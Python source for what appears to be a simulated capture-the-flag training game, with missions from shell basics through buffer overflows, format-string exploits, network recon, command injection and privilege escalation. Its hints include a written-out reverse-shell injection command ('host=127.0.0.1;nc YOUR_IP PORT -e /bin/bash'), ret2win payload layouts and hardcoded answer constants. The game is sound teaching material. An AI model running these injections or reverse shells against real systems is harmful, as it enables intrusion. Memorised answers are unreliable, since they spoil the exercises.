"""Targets ("missions") and the ~/todo file that tracks them.

Targets are independent: each can be taken on in any order. A target is a list of
checks evaluated against the simulated world (files that exist, things the player
has done). Once every check has passed, the target is latched as complete.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import TYPE_CHECKING, Callable

from .vfs import VFSError

if TYPE_CHECKING:
    from .world import World

ACME_TOKEN = "TKN-7f3a-91c2"
CULPRIT_IP = "203.0.113.77"
BLOB_SECRET = "ORCHID-4471"
VAULT_PASS = "N1ghtOwl"
DIAGD_CHOICE = "1337"
DIAGD_HIDDEN = ("debug_dump", "sym.debug_dump")
NOTICE_OFFSET = "13"


@dataclass
class Check:
    text: str
    test: Callable[["World"], bool]


@dataclass
class Mission:
    id: str
    title: str
    blurb: str
    checks: list[Check]
    hint: str = ""


def _read(world: "World", path: str) -> bytes | None:
    try:
        node = world.vfs.get(path)
    except VFSError:
        return None
    return None if node.is_dir else node.data


def _text(world: "World", path: str) -> str | None:
    data = _read(world, path)
    return None if data is None else data.decode("utf-8", errors="replace")


def _is_dir(world: "World", path: str) -> bool:
    try:
        return world.vfs.get(path).is_dir
    except VFSError:
        return False


_script_cache: dict[tuple[str, str, str], str] = {}


def _script_output(world: "World", path: str) -> str | None:
    """Run a player script in a throwaway world, so checking has no side effects."""
    text = _text(world, path)
    if text is None:
        return None
    key = (text, world.user, world.hostname)
    if key not in _script_cache:
        from ..shell.shell import Shell
        from .world import World as W

        scratch = Shell(W(world.user, world.hostname, missions=False))
        scratch.vfs.install("/tmp/check.sh", text, owner=world.user, mode=0o755)
        out = scratch.run_line("/tmp/check.sh")
        _script_cache[key] = b"".join(d for d, is_err in out.chunks if not is_err).decode("utf-8", errors="replace")
        if len(_script_cache) > 64:
            _script_cache.pop(next(iter(_script_cache)))
    return _script_cache[key]


def _ips(text: str | None) -> set[str]:
    import re

    return set(re.findall(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", text or ""))


def _lines(text: str | None) -> set[str]:
    return {ln.strip() for ln in (text or "").splitlines() if ln.strip()}


def _number(text: str | None) -> int | None:
    """Parse a player's note as a number: 72, 0x48 and 0X48 all work; anything else is None."""
    if not text or not text.strip():
        return None
    try:
        return int(text.strip().splitlines()[0].strip(), 0)
    except ValueError:
        return None


_py_cache: dict[tuple[str, str, str], bool] = {}


def _python_solves_motd(world: "World", path: str) -> bool:
    """Run the player's own exploit script against a throwaway copy of motd; no side effects."""
    text = _text(world, path)
    if text is None or not text.strip():
        return False
    key = (text, world.user, world.hostname)
    if key not in _py_cache:
        from ..shell.shell import Shell
        from .world import World as W

        scratch_world = W(world.user, world.hostname, missions=False)
        scratch = Shell(scratch_world)
        scratch.vfs.install("/tmp/exploit.py", text, owner=world.user, mode=0o755)
        scratch.run_line("cd motd-daemon")
        scratch.run_line("python3 /tmp/exploit.py")
        _py_cache[key] = "solved:motd-daemon" in scratch_world.events
        if len(_py_cache) > 64:
            _py_cache.pop(next(iter(_py_cache)))
    return _py_cache[key]


def _serial_accepted(world: "World", path: str) -> bool:
    """Feed the player's serial to the license checker (a throwaway process, no side effects)."""
    from .machine import Process

    text = _text(world, path)
    level = world.levels.get("license-check")
    if text is None or level is None or not text.strip():
        return False
    return Process(level).feed(text.strip().splitlines()[0].encode() + b"\n").solved


def build_missions(world: "World") -> list[Mission]:
    w = world.home + "/workspace"
    return [
        Mission(
            "workbench",
            "Set up your workbench",
            "Every operator needs a clean place to work.",
            [
                Check("create the directory ~/workspace", lambda wd: _is_dir(wd, w)),
                Check('put a file hello.txt in it containing the word "hello"',
                      lambda wd: "hello" in (_text(wd, w + "/hello.txt") or "").lower()),
                Check("use a pipe (|) in a command", lambda wd: "pipe" in wd.events),
            ],
            "mkdir, echo, and > are enough for the first two. Try: ls | wc -l",
        ),
        Mission(
            "scribe",
            "Learn the editor",
            "Notes get written in vim. Get comfortable in it.",
            [
                Check("write ~/workspace/poem.txt with at least 4 lines",
                      lambda wd: len([l for l in (_text(wd, w + "/poem.txt") or "").splitlines() if l.strip()]) >= 4),
                Check("select text in visual mode (v or V) and delete or yank it",
                      lambda wd: "vim:visual-op" in wd.events),
                Check("run a substitution with :s or :%s", lambda wd: "vim:substitute" in wd.events),
                Check("repeat a change with the . key", lambda wd: "vim:repeat" in wd.events),
            ],
            "vim ~/workspace/poem.txt, then i to insert, Esc, :wq. Try v, d, :%s/a/b/g and . on your own text.",
        ),
        Mission(
            "automation",
            "Automate something",
            "Write ~/workspace/count.sh so that running it prints the numbers 1 to 5, one per line.",
            [
                Check("~/workspace/count.sh exists, is executable, and starts with #!/bin/bash",
                      lambda wd: _exec_script(wd, w + "/count.sh")),
                Check("it uses a loop (for or while) or brace expansion ({1..5})",
                      lambda wd: any(k in (_text(wd, w + "/count.sh") or "")
                                     for k in ("for ", "while ", "until ", "{1..5}", "{1..5..1}"))),
                Check("running it prints 1 2 3 4 5, one per line",
                      lambda wd: (_script_output(wd, w + "/count.sh") or "").split() == ["1", "2", "3", "4", "5"]),
            ],
            "chmod +x makes a script executable. seq 5 or $((i+1)) can help -- or skip the loop entirely "
            "with brace expansion: for i in {1..5}; do echo $i; done, or even printf '%s\\n' {1..5}.",
        ),
        Mission(
            "dig",
            "Dig for a token",
            "A service called acme left an access token somewhere on this machine. "
            "Find it and save it to ~/workspace/token.txt.",
            [
                Check("~/workspace/token.txt contains exactly the token",
                      lambda wd: (_text(wd, w + "/token.txt") or "").strip() == ACME_TOKEN),
            ],
            "Hidden files start with a dot. find / -name '.*token*' and grep -r are your friends; "
            "some directories will say Permission denied, and that's fine.",
        ),
        Mission(
            "logs",
            "Read the logs",
            "Someone pulled the admin export from the web app. Its access log is /var/log/webapp/access.log. "
            f"Find the client IP that got a successful (200) GET of /admin/export and save it to {w}/culprit.txt.",
            [
                Check("~/workspace/culprit.txt contains exactly that IP",
                      lambda wd: (_text(wd, w + "/culprit.txt") or "").strip() == CULPRIT_IP),
            ],
            "grep narrows lines down; awk '{print $1}' picks the first column; sort | uniq -c counts. "
            "Careful: other clients tried the same path and were refused.",
        ),
        Mission(
            "carve",
            "Carve a secret out of a blob",
            "A partner dropped an opaque file at /srv/drop/artifact.bin. It is not meant to be run. "
            f"Somewhere inside is a line starting with `secret=`. Save the value to {w}/secret.txt.",
            [
                Check("~/workspace/secret.txt contains exactly the secret value",
                      lambda wd: (_text(wd, w + "/secret.txt") or "").strip() == BLOB_SECRET),
            ],
            "file tells you what a blob is; strings pulls out readable text; xxd shows the raw bytes.",
        ),
        Mission(
            "toolbelt",
            "Learn the toolbox",
            "Before you attack anything, learn to look inside it. Practise on ~/motd-daemon/motd.",
            [
                Check("analyze a binary in r2 (aa or aaa)", lambda wd: "r2:analyzed" in wd.events),
                Check("disassemble a function in r2 (pdf)", lambda wd: "r2:disassembled" in wd.events),
                Check("check a binary's protections with checksec", lambda wd: "checksec:used" in wd.events),
                Check("stop a program at a breakpoint in gdb", lambda wd: "gdb:breakpoint-hit" in wd.events),
                Check("look at a stopped program's registers or memory in gdb",
                      lambda wd: "gdb:inspected" in wd.events),
            ],
            "r2 ./motd, then aaa, afl, pdf @ sym.vuln, q. checksec ./motd. "
            "gdb ./motd, then break vuln, run, (type a name), info registers, x/8gx $rsp. help gdb and man r2 list what works.",
        ),
        Mission(
            "motd",
            "Break the motd service",
            "The Brightside motd greeter in ~/motd-daemon is rumored to be sloppy. Read its README, "
            "poke at the program, and get the flag out of it.",
            [
                Check("make ./motd crash", lambda wd: bool({"crash:motd-daemon", "solved:motd-daemon"} & wd.events)),
                Check("get the program to print the flag", lambda wd: "solved:motd-daemon" in wd.events),
            ],
            "Start with ~/motd-daemon/README.txt. checksec ./motd shows which protections are missing. "
            "Feed it longer and longer input, then look at the crash in gdb (info registers, x/gx $rsp). "
            "cyclic helps you measure distances; python3 with `from pwn import *` can build and send the input.",
        ),
        Mission(
            "motd-dissect",
            "Document the exploit, then script it",
            "Breaking motd is one thing; proving you understand it is another. Write down what you found, then "
            f"automate it. Save each finding as a plain number in {w}, and the finishing script as "
            f"{w}/exploit.py.",
            [
                Check("win-addr.txt holds the address of win()",
                      lambda wd: _number(_text(wd, w + "/win-addr.txt")) == 0x401196),
                Check("canary.txt says whether a stack canary protects vuln() (no)",
                      lambda wd: (_text(wd, w + "/canary.txt") or "").strip().lower() in ("no", "none", "no canary", "false")),
                Check("offset.txt holds the byte offset to the saved return address",
                      lambda wd: _number(_text(wd, w + "/offset.txt")) == 72),
                Check("retaddr.txt holds the stack address the return address sits at",
                      lambda wd: _number(_text(wd, w + "/retaddr.txt")) == 0x7FFFFFFFDFD8),
                Check("exploit.py solves motd by itself when run from scratch",
                      lambda wd: _python_solves_motd(wd, w + "/exploit.py")),
            ],
            "r2 (afl) or gdb (info functions) give win()'s address. checksec names the missing canary. "
            "cyclic 100, feed it in, then cyclic -l on the crash address gives the offset; x/gx $rsp at the crash "
            "gives the stack address. For the script: `from pwn import *`, build b'A'*offset + p64(win_addr), "
            "then process('./motd').sendline(payload) and check the output for the flag.",
        ),
        Mission(
            "vault",
            "Open the vault",
            "The vault tool in ~/vault only opens for the right passphrase, and strings won't give it up. "
            f"Find the passphrase, save it to {w}/passphrase.txt, and get the program to print its flag.",
            [
                Check("~/workspace/passphrase.txt contains exactly the passphrase",
                      lambda wd: (_text(wd, w + "/passphrase.txt") or "").strip() == VAULT_PASS),
                Check("get ./vault to print the flag", lambda wd: "solved:vault" in wd.events),
            ],
            "Read ~/vault/README.txt. In r2 try aaa then pdf @ sym.check_password: what is it comparing against? "
            "Or break on strcmp in gdb and x/s the registers that hold its two arguments.",
        ),
        Mission(
            "license",
            "Forge a license",
            "Brightside's license checker in ~/license accepts many serials but nobody wrote down the rule. "
            f"Work it out, save a serial it accepts to {w}/serial.txt, and get the program to print its flag.",
            [
                Check("~/workspace/serial.txt holds a serial ./license accepts", lambda wd: _serial_accepted(wd, w + "/serial.txt")),
                Check("get ./license to print the flag", lambda wd: "solved:license-check" in wd.events),
            ],
            "Read ~/license/README.txt. pdf @ sym.check_serial in r2 shows a loop: what does it add up, and what must the first "
            "character, the length and the total be? Stepping through it in gdb (si, info registers) shows the running total.",
        ),
        Mission(
            "diagd",
            "Find the hidden option",
            "The diagnostics tool in ~/diagd documents two menu options, but a developer left a third. "
            f"Find the function behind it and the number that reaches it. Save the function name to {w}/hidden.txt, "
            f"the number to {w}/choice.txt, and get the program to print its flag.",
            [
                Check("~/workspace/hidden.txt names the hidden function",
                      lambda wd: (_text(wd, w + "/hidden.txt") or "").strip() in DIAGD_HIDDEN),
                Check("~/workspace/choice.txt holds the secret menu number",
                      lambda wd: (_text(wd, w + "/choice.txt") or "").strip() == DIAGD_CHOICE),
                Check("get ./diagd to print the flag", lambda wd: "solved:diagd" in wd.events),
            ],
            "strings will not help. In r2, afl lists every function: is there one that main never mentions in its menu? "
            "axt on it tells you who calls it, and pdf @ main shows what the program compares your input against.",
        ),
        Mission(
            "notice",
            "Leak the flag through a format string",
            "~/notice posts whatever you type right back -- by handing it straight to printf() as the format string itself, "
            f"not as data. Find the %N$ that reaches a secret pointer sitting on the stack, save N to {w}/notice-offset.txt, "
            "and get the program to print its flag.",
            [
                Check("notice-offset.txt holds the %N$ index that reaches the secret",
                      lambda wd: (_text(wd, w + "/notice-offset.txt") or "").strip() == NOTICE_OFFSET),
                Check("get ./notice to print the flag", lambda wd: "solved:notice" in wd.events),
            ],
            "%x and %p are safe to probe with; %s dereferences its argument and can crash if it is garbage. "
            "Try ./notice with payloads like %1$x, %2$x, ... -- one of them will print an address that looks like it "
            "points into the binary's own data (r2's iz/pdf show where strings live). Once you find it, %N$s prints "
            "whatever it points to instead of its raw hex value.",
        ),
        Mission(
            "sentry",
            "Get past the canary",
            "~/sentry has the same bug as motd, but checksec now reports a real stack canary. A plain ret2win "
            f"corrupts it and the program aborts instead of returning. Save the canary's exact value to {w}/canary-value.txt, "
            "then build a payload that writes it back unchanged on the way to the return address.",
            [
                Check("trip the canary with a naive overflow (stack smashing detected)",
                      lambda wd: "abort:sentry" in wd.events),
                Check("canary-value.txt holds the exact canary value",
                      lambda wd: _number(_text(wd, w + "/canary-value.txt")) == 0xBAADF000),
                Check("get ./sentry to print the flag", lambda wd: "solved:sentry" in wd.events),
            ],
            "checksec ./sentry now says Canary found. r2's pdf @ sym.vuln shows `cmp rax, 0x...` with the canary's "
            "value right there as a constant (this simulation has no ASLR, so it never changes); gdb's x/gx on the "
            "same stack slot shows the same thing dynamically. The payload is junk up to the canary, the canary's "
            "own bytes, 8 more junk bytes for the saved rbp, then win()'s address -- p64() handles the packing.",
        ),
        Mission(
            "dispatch",
            "Overwrite a dispatch table entry",
            "~/dispatch relays your message through a table of function pointers before printing it, and never "
            f"checks that the entry still points where it should. Find the %N$ that reaches the table slot's own "
            f"address (not its contents -- that's a different index), save N to {w}/table-offset.txt, then use "
            "%n or %hn to make the slot point at win() instead, and get the program to print its flag.",
            [
                Check("table-offset.txt holds the %N$ index that reaches the table slot's address",
                      lambda wd: _number(_text(wd, w + "/table-offset.txt")) == 613),
                Check("get ./dispatch to print the flag", lambda wd: "solved:dispatch" in wd.events),
            ],
            "This needs two things notice's lesson did not: a %N$x scan finds an index whose VALUE is itself a "
            "stack address (not a leaked secret) -- that's the table slot, found through table_slot's own pointer "
            "sitting next to the buffer the same way notice's secret did. Then %WIDTHd%N$hn writes WIDTH (mod "
            "65536) into whatever that address holds; since win() and the real function share the same upper "
            "bytes in this simulation, overwriting just the low 16 bits with win()'s low 16 bits is enough. "
            "Printing WIDTH literal characters to get there is impractical by hand -- a width specifier does the "
            "padding without you typing it.",
        ),
        Mission(
            "recon",
            "Map the network",
            "Brightside's lab network is 10.10.0.0/24. You have no map of it. Find what is alive, what is hiding, "
            f"and what the machine on the odd port will tell you. Save your findings in {w}.",
            [
                Check("hosts.txt lists the machines that answer a ping sweep (their IPs)",
                      lambda wd: {"10.10.0.1", "10.10.0.10", "10.10.0.20"} <= _ips(_text(wd, w + "/hosts.txt"))
                      <= {"10.10.0.1", "10.10.0.10", "10.10.0.20", "10.10.0.30"}),
                Check("quiet-host.txt holds the IP of the machine that never answers pings",
                      lambda wd: _ips(_text(wd, w + "/quiet-host.txt")) == {"10.10.0.30"}),
                Check("scan every port (-p-) of a machine", lambda wd: "net:nmap-allports" in wd.events),
                Check("hidden-port.txt holds the port a default scan misses on files",
                      lambda wd: (_text(wd, w + "/hidden-port.txt") or "").strip() == "9999"),
                Check("ask the name server for the whole zone (a zone transfer)", lambda wd: "net:dns-axfr" in wd.events),
                Check("ctl.txt holds the flag from the service's undocumented command",
                      lambda wd: (_text(wd, w + "/ctl.txt") or "").strip() == wd.net.secrets["flag_ctl"]),
            ],
            "nmap -sn 10.10.0.0/24 finds the hosts that answer; nmap -Pn on a machine that does not. A default scan covers about a thousand ports: try -p-. "
            "dig axfr brightside.lab @10.10.0.1 asks for the zone. nc files 9999 and try HELP; the banner may not tell the whole story.",
        ),
        Mission(
            "webenum",
            "Enumerate the web app",
            "The intranet web server at intranet.brightside.lab says little, but it leaks. Work through it with curl "
            f"and save what you find in {w}.",
            [
                Check("disallowed.txt lists the paths robots.txt asks crawlers to skip",
                      lambda wd: {"/backup/", "/admin/"} <= _lines(_text(wd, w + "/disallowed.txt"))),
                Check("deploy-password.txt holds the password someone left in a backup",
                      lambda wd: (_text(wd, w + "/deploy-password.txt") or "").strip() == wd.net.secrets["deploy_pass"]),
                Check("admin-flag.txt holds the flag from the admin console",
                      lambda wd: (_text(wd, w + "/admin-flag.txt") or "").strip() == wd.net.secrets["flag_admin"]),
                Check("ticket.txt holds the ticket number shown in the staff portal after logging in",
                      lambda wd: (_text(wd, w + "/ticket.txt") or "").strip() == wd.net.secrets["ticket"]),
                Check("vhost-flag.txt holds the flag from the site the server only shows under another name",
                      lambda wd: (_text(wd, w + "/vhost-flag.txt") or "").strip() == wd.net.secrets["flag_vhost"]),
            ],
            "curl -s http://intranet/robots.txt, then read what it forbids. Pages have comments: look at the source of /login, and send the form with -d and a cookie jar (-c, -b). "
            "-u user:pass does HTTP basic auth. The https port has a certificate: nmap -A -p 443 intranet lists every name on it, "
            "and curl -k --resolve NAME:443:IP https://NAME/ (or -H 'Host: NAME') asks for that site.",
        ),
        Mission(
            "revshell",
            "Get a shell back",
            "A diagnostic utility on intranet's tools service (port 8080) builds a command from whatever "
            "you give it. Make it connect back to a listener you control, then read the file only "
            f"the web server's own user can see. Save its flag to {w}/shell-flag.txt.",
            [
                Check("open a listener for the connection", lambda wd: "net:nc-listen" in wd.events),
                Check("get the vulnerable endpoint to connect back to it",
                      lambda wd: "net:revshell:intranet.brightside.lab" in wd.events),
                Check("shell-flag.txt holds the flag only readable as www-data",
                      lambda wd: (_text(wd, w + "/shell-flag.txt") or "").strip() == wd.net.secrets["flag_wwwdata"]),
            ],
            "nmap -A -p 8080 intranet shows a Jetty server; the only documented path is /status, but try /ping?host=. "
            "Open a listener first (nc -lvnp PORT &), then curl \"http://intranet:8080/ping?host=127.0.0.1;nc YOUR_IP PORT -e /bin/bash\" "
            "(your IP is shown by `ip addr` or `hostname -I`). fg picks up the connection once it lands; "
            "cat the file, then exit and write what it said into shell-flag.txt.",
        ),
        Mission(
            "breach",
            "Walk the whole chain",
            "Everything on the lab network connects: the recon you did, the password webenum leaked, the shell "
            "revshell got you, and a key sitting on that very box all lead somewhere further in. Follow it to "
            f"the end and save the final flag to {w}/breach-flag.txt.",
            [
                Check("got a shell on intranet through the web exploit",
                      lambda wd: "net:revshell:intranet.brightside.lab" in wd.events),
                Check("logged into intranet over ssh with the leaked deploy password",
                      lambda wd: "net:ssh:intranet.brightside.lab" in wd.events),
                Check("pivoted from intranet to the internal vault host",
                      lambda wd: "net:ssh:vault.brightside.lab" in wd.events),
                Check("breach-flag.txt holds the flag from the far side of the pivot",
                      lambda wd: (_text(wd, w + "/breach-flag.txt") or "").strip() == wd.net.secrets["flag_pivot"]),
            ],
            "deploy's home directory on intranet (reached either over ssh or through the reverse shell) has notes "
            "pointing at a key and an internal host; ssh -i with that key gets you there. This mission does not "
            "add a new technique -- it is the same recon, webenum and revshell work, followed one step further.",
        ),
        Mission(
            "privesc",
            "Escalate through a setuid binary",
            "Once you have any shell on intranet, look for a setuid-root program someone left behind -- a real "
            f"attacker would. Exploit it to read root's own file and save the flag to {w}/privesc-flag.txt.",
            [
                Check("have a shell on intranet (ssh or the reverse shell both count)",
                      lambda wd: bool({"net:ssh:intranet.brightside.lab", "net:revshell:intranet.brightside.lab"} & wd.events)),
                Check("get ./logsweep to print the flag", lambda wd: "solved:logsweep" in wd.events),
                Check("privesc-flag.txt holds the flag",
                      lambda wd: (_text(wd, w + "/privesc-flag.txt") or "").strip() == wd.levels["logsweep"].flag),
            ],
            "find / -perm -4000 2>/dev/null lists every setuid binary; ls -l on it shows the s in rws, which is "
            "what makes this different from exploiting the exact same bug on your own box -- there, the file is "
            "not setuid, and the exploit would not get you anything you could not already read. checksec and the "
            "exploit itself are identical to motd-daemon's.",
        ),
    ]


def _exec_script(world: "World", path: str) -> bool:
    try:
        node = world.vfs.get(path)
    except VFSError:
        return False
    return not node.is_dir and bool(node.mode & 0o100) and node.data.startswith(b"#!/bin/bash")


@dataclass
class MissionLog:
    world: "World"
    missions: list[Mission] = field(default_factory=list)
    completed: list[str] = field(default_factory=list)

    def __post_init__(self) -> None:
        self.missions = build_missions(self.world)

    @property
    def todo_path(self) -> str:
        return self.world.home + "/todo"

    def evaluate(self) -> list[Mission]:
        """Latch newly completed targets, refresh ~/todo, and return the new ones."""
        newly = []
        for m in self.missions:
            if m.id not in self.completed and all(c.test(self.world) for c in m.checks):
                self.completed.append(m.id)
                newly.append(m)
        self.refresh_file()
        return newly

    def todo_text(self) -> str:
        done = len(self.completed)
        lines = [
            "TODO -- targets",
            "===============",
            "",
            "Take these on in any order. This file updates itself as you work.",
            f"Progress: {done}/{len(self.missions)} complete.",
            "",
        ]
        for m in self.missions:
            complete = m.id in self.completed
            lines.append(f"[{'x' if complete else ' '}] {m.id} -- {m.title}")
            lines.append(f"      {m.blurb}")
            for c in m.checks:
                ok = complete or c.test(self.world)
                lines.append(f"      [{'x' if ok else ' '}] {c.text}")
            if m.hint and not complete:
                lines.append(f"      hint: {m.hint}")
            lines.append("")
        return "\n".join(lines)

    def refresh_file(self) -> None:
        text = self.todo_text().encode()
        try:
            node = self.world.vfs.get(self.todo_path)
            if node.data != text:
                node.data = text
        except VFSError:
            self.world.vfs.install(self.todo_path, text, owner="root", mode=0o644)
